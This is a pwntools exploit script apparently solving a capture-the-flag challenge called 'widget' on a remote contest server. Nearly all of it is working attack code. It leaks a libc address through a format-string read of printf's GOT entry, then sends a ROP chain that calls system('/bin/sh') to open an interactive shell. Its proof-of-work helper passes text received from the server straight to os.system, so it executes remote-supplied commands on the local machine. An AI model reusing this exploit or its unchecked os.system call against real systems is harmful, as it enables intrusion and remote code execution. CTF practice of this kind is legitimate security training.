from pwn import *
context.binary = "./widget"
chall = ELF("./widget")

gdbscripter = '''
bp 0x00000000004014C6
break *main+128
bp 0x000000000040142F
bp 0x000000000040142F
'''
s = remote("challs.actf.co", 31320)
import os

def PoW():
	s.recvuntil(b"proof of work: ")
	msg = s.recvline(0).decode()
	os.system(msg + " > pow.txt")
	msg = open("pow.txt", "rb").read()
	s.sendlineafter(b"solution: ", msg)
PoW()

#s = process(executable="./widget", argv = [])
#s = gdb.debug("./widget", gdbscript = gdbscripter)

main = p64(chall.symbols["main"])
retaddr = p64(0x00000000004013E3)
bss = chall.bss()
printf_addr = chall.got["printf"]
called = chall.symbols["called"]

ret = p64(0x000000000040101a)
win = p64(chall.symbols["win"])
print(hex(called))
print(hex(bss))


fmt = fmtstr_payload(offset = 8, writes = {called : 0})
leakstring = b"%9$saaaa" + p64(printf_addr)

payload = leakstring + b"a"*0x10 + p64(bss + 0x800) + retaddr

s.sendline(str(len(payload)).encode())
s.send(payload)
s.recvuntil(b"Your input: ")
addr = int.from_bytes(s.recv(6), "little")
#print(hex(addr))


libc_base = addr - 0x0000000000060770
pop_rdi = p64(libc_base + 0x000000000002a3e5)
pop_rsi = p64(libc_base + 0x000000000002be51)
s1 = 0x0000000000402008
s2 = 0x0000000000402029
system = p64(libc_base + 0x0000000000050d60)
binsh = libc_base + 0x1d8698

payload = b"a"*0x20 + b"aaaaaaaa" + pop_rdi + p64(binsh) + ret + system
s.sendline(str(len(payload)).encode())
s.send(payload)
s.interactive()